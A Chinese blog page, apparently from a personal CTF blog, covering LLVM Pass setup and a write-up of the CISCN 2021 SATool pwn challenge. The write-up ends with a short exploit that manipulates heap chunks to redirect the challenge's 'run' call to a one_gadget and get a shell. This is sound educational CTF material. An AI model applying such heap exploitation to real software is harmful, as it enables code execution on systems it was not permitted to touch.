@@ -1,0 +1,781 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/duck.png">
+  <link rel="icon" href="/img/icon/duck.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#f58f98">
+  <meta name="author" content="Loora1N">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="本文用于介绍PWN中解释器类型题目所需环境搭建">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LLVM PASS环境搭建与基本使用">
+<meta property="og:url" content="http://loora1n.github.io/2022/06/30/LLVM%20Pass%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/index.html">
+<meta property="og:site_name" content="鷺雨のBlog">
+<meta property="og:description" content="本文用于介绍PWN中解释器类型题目所需环境搭建">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://loora1n.github.io/img/article/llvmCreate/image-20220630221103947.png">
+<meta property="article:published_time" content="2022-06-29T16:57:54.233Z">
+<meta property="article:modified_time" content="2022-06-29T16:57:54.233Z">
+<meta property="article:author" content="Loora1N">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://loora1n.github.io/img/article/llvmCreate/image-20220630221103947.png">
+  
+  
+  
+  <title>LLVM PASS环境搭建与基本使用 - 鷺雨のBlog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extention.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"loora1n.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"lftEbNU4XPuR5dgHNV3WdWxP-gzGzoHsz","app_key":"b3uLUVGLeOWDwREWHMBr0jo9","server_url":"https://lftebnu4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>鷺雨のBlog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg/3.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="LLVM PASS环境搭建与基本使用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-06-30 00:57" pubdate>
+          2022年6月30日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          49 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          阅读量 <span id="leancloud-page-views"></span>
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">LLVM PASS环境搭建与基本使用</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="LLVM-Pass-环境搭建"><a href="#LLVM-Pass-环境搭建" class="headerlink" title="LLVM Pass 环境搭建"></a>LLVM Pass 环境搭建</h2><h3 id="预编译包的安装"><a href="#预编译包的安装" class="headerlink" title="预编译包的安装"></a>预编译包的安装</h3><p>在Ubuntu上，可以直接通过<code>apt</code>安装llvm和clang：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt install llvm<br>$ sudo apt install clang<br></code></pre></td></tr></table></figure>
+
+<h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> llvm-project<br>$ <span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> build<br>$ cmake -G <span class="hljs-string">&quot;Unix Makefiles&quot;</span> -DLLVM_ENABLE_PROJECTS=<span class="hljs-string">&quot;clang&quot;</span> \<br>    -DCMAKE_BUILD_TYPE=Release -DLLVM_TARGETS_TO_BUILD=<span class="hljs-string">&quot;X86&quot;</span> \<br>    -DBUILD_SHARED_LIBS=On ../llvm<br>$ make<br></code></pre></td></tr></table></figure>
+
+<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="Hello-Pass-编写"><a href="#Hello-Pass-编写" class="headerlink" title="Hello Pass 编写"></a>Hello Pass 编写</h3><p>随意找一处作为项目文件夹Hello，并编写main.c如下所示</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">loorain</span><span class="hljs-params">()</span>&#123;&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwn</span><span class="hljs-params">()</span>&#123;&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello World LLVM PASS&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编写Hello.cpp如下，如下代码含义可阅读官方文档：<a target="_blank" rel="noopener" href="https://llvm.org/docs/WritingAnLLVMPass.html#introduction-what-is-a-pass">Writing an LLVM Pass — LLVM 15.0.0git documentation</a></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Pass.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Function.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Hello</span> : <span class="hljs-keyword">public</span> FunctionPass &#123;<br>        <span class="hljs-type">static</span> <span class="hljs-type">char</span> ID;<br>        <span class="hljs-built_in">Hello</span>() : <span class="hljs-built_in">FunctionPass</span>(ID) &#123;&#125;<br>        <br>        <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> <span class="hljs-keyword">override</span> </span>&#123;<br>            <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;Hello: &quot;</span>;<br>            <span class="hljs-built_in">errs</span>().<span class="hljs-built_in">write_escaped</span>(F.<span class="hljs-built_in">getName</span>()) &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<span class="hljs-comment">//遍历所有的函数名称，并以“Hello：&lt;函数名&gt;”的形式输出</span><br>    &#125;;<br>&#125;<br><br><span class="hljs-type">char</span> Hello::ID = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//for opt</span><br><span class="hljs-function"><span class="hljs-type">static</span> RegisterPass&lt;Hello&gt; <span class="hljs-title">X</span><span class="hljs-params">(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;Hello world Pass&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>)</span></span>;<br><span class="hljs-comment">//for clang</span><br><span class="hljs-function"><span class="hljs-type">static</span> llvm::RegisterStandardPasses <span class="hljs-title">Y</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    llvm::PassManagerBuilder::EP_EarlyAsPossible,</span></span><br><span class="hljs-params"><span class="hljs-function">    [](<span class="hljs-type">const</span> llvm::PassManagerBuilder &amp;Builder,</span></span><br><span class="hljs-params"><span class="hljs-function">       llvm::legacy::PassManagerBase &amp;PM) &#123; PM.add(<span class="hljs-keyword">new</span> Hello()); &#125;)</span></span>;<br></code></pre></td></tr></table></figure>
+
+<h3 id="命令行编译"><a href="#命令行编译" class="headerlink" title="命令行编译"></a>命令行编译</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`   <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>llvm-config</code>提供了<code>CXXFLAGS</code>与<code>LDFLAGS</code>参数方便查找LLVM的头文件与库文件。 如果链接有问题，还可以用<code>llvm-config --libs</code>提供动态链接的LLVM库。 具体<code>llvm-config</code>打印了什么，请自行尝试或查找官方文档。</li>
+<li><code>-fPIC -shared</code> 显然是编译动态库的必要参数。</li>
+<li>因为LLVM没用到RTTI，所以用<code>-fno-rtti</code> 来让我们的Pass与之一致。</li>
+<li><code>-Wl,-znodelete</code>主要是为了应对LLVM 5.0+中加载ModulePass引起segmentation fault的bug。如果你的Pass继承了ModulePass，还请务必加上。</li>
+</ul>
+<p>现在，你手中应该有一份编译好的LLVMHello.so了。根据刚才阅读过的官方文档的介绍，你知道可以通过命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang -S -emit-llvm main.c -o main.ll<br><span class="hljs-comment">#这里也可以使用&#x27;clang -c -emit-llvm main.c -o main.bc&#x27;区别在于bc文件是二进制文件无法阅读</span><br><span class="hljs-variable">$opt</span> -load LLVMHello.so -hello main.ll -o main<br><span class="hljs-comment">#这里的 -hello由Hello.cpp中的static RegisterPass&lt;Hello&gt; X参数决定</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在使用opt进行动态链接时，可能会出现错误：Error opening ‘LLVMHello.so’: LLVMHello.so: cannot open shared object file: No such file or directory</p>
+<p>这实际是由于linux中动态链接库的存放地点一般比较固定，无法在默认地址搜索到名为LLVMHello.so的动态链接库，那么我们可以在.bashrc或.zshrc中加入代表当前目录的地址，如下所示：</p>
+<p>export LD_LIBRARY_PATH&#x3D;$LD_LIBRARY_PATH:.  </p>
+</blockquote>
+<p><img src="/img/article/llvmCreate/1.png" alt="效果图"></p>
+<p>如图所示，我们确实输出了main.c中所有函数名称</p>
+<h2 id="例题一：CISCN-2021-SATool"><a href="#例题一：CISCN-2021-SATool" class="headerlink" title="例题一：CISCN 2021 SATool"></a>例题一：CISCN 2021 SATool</h2><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>这类题目对我们有用的部分opt和so文件，逆向分析SAPass.so文件</p>
+<p><img src="/img/article/llvmCreate/image-20220630204900814.png" alt="image-20220630204900814"></p>
+<p>在<code>start</code>函数中，主要内容是注册了一些函数，没什么有用的信息。在分析so文件时，一般重点是分析重写的<code>runOnFunction</code>函数，我们大多可以在函数表的最下方找到重写的<code>runOnFunction</code>函数</p>
+<p><img src="/img/article/llvmCreate/image-20220630205306216.png" alt="image-20220630205306216"></p>
+<p>在这里我们看到<code>sub_19D0</code>就是我们要找的函数，分析函数内容，这也是在我看来LLVM PASS 类题目最核心的地方——代码逆向分析。毕竟一个函数就要整整550行，能够快速地筛选什么是关键信息，什么是垃圾信息是关键。</p>
+<p><img src="/img/article/llvmCreate/image-20220630210526791.png" alt="image-20220630210526791"></p>
+<p>函数一开头就判断了我们的函数名称是不是<code>B4ckDo0r</code>, 这里由于Name的类型是QWORD存储，并非直接字符串，所以要反过来读。之后又分了5个操作分别是save, takeway, stealkey, fakekey, run.</p>
+<p>在save操作中，进行了堆块的创建</p>
+<p><img src="/img/article/llvmCreate/image-20220630211613541.png" alt="image-20220630211613541"></p>
+<p>在stealkey中，将刚刚申请的heap中内容给了204100（takeway也是跳转到了stealkey中）</p>
+<p><img src="/img/article/llvmCreate/image-20220630211950647.png" alt="image-20220630211950647"></p>
+<p>在fakekey中，将heap的内容加上了参数的值，即可编辑heap的内容（这里的heap_con就是204100，我改了个名字）</p>
+<p><img src="/img/article/llvmCreate/image-20220630212337680.png" alt="image-20220630212337680"></p>
+<p>run函数，就是直接call *heap</p>
+<p><img src="/img/article/llvmCreate/image-20220630213353185.png" alt="image-20220630213353185"></p>
+<h3 id="GDB-调试LLVM-PASS"><a href="#GDB-调试LLVM-PASS" class="headerlink" title="GDB 调试LLVM PASS"></a>GDB 调试LLVM PASS</h3><p>首先我们编写部分exp，类似我们动态做普通的PWN题目。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang -S -emit-llvm exp.c -o exp.ll -v<br><span class="hljs-comment">#这里加上 -v 可以显示出详细参数</span><br></code></pre></td></tr></table></figure>
+
+<p>我们主要途中圈的这一部分</p>
+<p><img src="/img/article/llvmCreate/image-20220630221103947.png" alt="image-20220630221103947"></p>
+<blockquote>
+<p>-triple x86_64-pc-linux-gnu -emit-llvm -disable-free -disable-llvm-verifier -discard-value-names -main-file-name exp.c -mrelocation-model static -mthread-model posix -mframe-pointer&#x3D;all -fmath-errno -fno-rounding-math -masm-verbose -mconstructor-aliases -munwind-tables -target-cpu x86-64 -dwarf-column-info -fno-split-dwarf-inlining -debugger-tuning&#x3D;gdb -v -resource-dir &#x2F;usr&#x2F;lib&#x2F;llvm-10&#x2F;lib&#x2F;clang&#x2F;10.0.0 -internal-isystem &#x2F;usr&#x2F;local&#x2F;include -internal-isystem &#x2F;usr&#x2F;lib&#x2F;llvm-10&#x2F;lib&#x2F;clang&#x2F;10.0.0&#x2F;include -internal-externc-isystem &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu -internal-externc-isystem &#x2F;include -internal-externc-isystem &#x2F;usr&#x2F;include -fdebug-compilation-dir &#x2F;home&#x2F;loorain&#x2F;ciscn&#x2F;CISCN_2021_pwn&#x2F;SATool_附件 -ferror-limit 19 -fmessage-length 0 -fgnuc-version&#x3D;4.2.1 -fobjc-runtime&#x3D;gcc -fdiagnostics-show-option -fcolor-diagnostics -faddrsig -o exp.ll -x c exp.c</p>
+</blockquote>
+<p>在另一终端中使用如下指令,即可开始调试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb clang<br>GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2<br>......<br>......<br>pwndbg&gt; <span class="hljs-built_in">set</span> args -triple x86_64-pc-linux-gnu -emit-llvm -disable-free -disable-llvm-verifier -discard-value-names -main-file-name exp.c -mrelocation-model static -mthread-model posix -mframe-pointer=all -fmath-errno -fno-rounding-math -masm-verbose -mconstructor-aliases -munwind-tables -target-cpu x86-64 -dwarf-column-info -fno-split-dwarf-inlining -debugger-tuning=gdb -v -resource-dir /usr/lib/llvm-10/lib/clang/10.0.0 -internal-isystem /usr/local/include -internal-isystem /usr/lib/llvm-10/lib/clang/10.0.0/include -internal-externc-isystem /usr/include/x86_64-linux-gnu -internal-externc-isystem /include -internal-externc-isystem /usr/include -fdebug-compilation-dir /home/loorain/ciscn/CISCN_2021_pwn/SATool_附件 -ferror-limit 19 -fmessage-length 0 -fgnuc-version=4.2.1 -fobjc-runtime=gcc -fdiagnostics-show-option -fcolor-diagnostics -faddrsig -o exp.ll -x c exp.c<br>pwndbg&gt; b main<br>Breakpoint 1 at 0x40da90<br>pwndbg&gt; n<br>The program is not being run.<br>pwndbg&gt; r<br></code></pre></td></tr></table></figure>
+
+<h3 id="解题思路-amp-EXP"><a href="#解题思路-amp-EXP" class="headerlink" title="解题思路&amp;EXP"></a>解题思路&amp;EXP</h3><ul>
+<li><p>先申请多个chunk讲tache腾空，以申请unsortbin中的chunk</p>
+</li>
+<li><p>在申请unsortbin时，第一个参数放置’\x00‘以此保留libc信息</p>
+</li>
+<li><p>利用stealkey和fakekey将chunk中的fd更改为onegadget</p>
+</li>
+<li><p>然后利用run直接getshell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">save</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1,<span class="hljs-type">char</span> *a2)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fakekey</span><span class="hljs-params">(int64)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">takeaway</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">stealkey</span><span class="hljs-params">()</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">B4ckDo0r</span><span class="hljs-params">()</span><br>&#123;<br>        save(<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>);<br>        save(<span class="hljs-string">&quot;aaddd&quot;</span>,<span class="hljs-string">&quot;aadd&quot;</span>);<br>        save(<span class="hljs-string">&quot;ssss&quot;</span>,<span class="hljs-string">&quot;sss&quot;</span>);<br>        save(<span class="hljs-string">&quot;ssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>        save(<span class="hljs-string">&quot;sssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>        save(<span class="hljs-string">&quot;sssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>    save(<span class="hljs-string">&quot;sssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>        save(<span class="hljs-string">&quot;\x00&quot;</span>,<span class="hljs-string">&quot;ssssss&quot;</span>);<br>        stealkey();<br>        fakekey(<span class="hljs-number">-0x2E19b4</span>);<br>        run();<br> <br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>LLVM PASS环境搭建与基本使用</div>
+      <div>http://loora1n.github.io/2022/06/30/LLVM Pass 环境搭建/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Loora1N</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年6月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/09/05/%E8%90%8C%E6%96%B0%E6%89%8B%E5%86%8C-PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="PWN环境搭建（萌新入门）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PWN环境搭建（萌新入门）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/21/CISCN%202022/" title="【CISCN2022】 东北赛区分区赛PWN WriteUP">
+                        <span class="hidden-mobile">【CISCN2022】 东北赛区分区赛PWN WriteUP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments">
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'loora1n/comment');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
